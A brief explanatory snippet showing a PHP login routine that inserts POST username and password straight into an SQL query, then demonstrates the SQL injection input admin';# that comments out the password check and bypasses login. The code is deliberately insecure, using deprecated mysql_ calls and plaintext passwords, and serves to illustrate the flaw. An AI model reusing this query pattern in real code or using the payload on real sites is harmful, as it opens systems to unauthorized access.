Example of how database connection works in php 

<?php
mysql_connect("localhost", "db_username", "db_password"); # Connection to the SQL
Database.
mysql_select_db("users"); # Database table where user information is stored.
$username=$_POST['username']; # User-specified username.
$password=$_POST['password']; #User-specified password.
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";


therefore you can log in wit username=  admin';#

which will make the full statement:  "SELECT * FROM users WHERE username='admin';#' AND password='$password'";
which bypasses the password validation
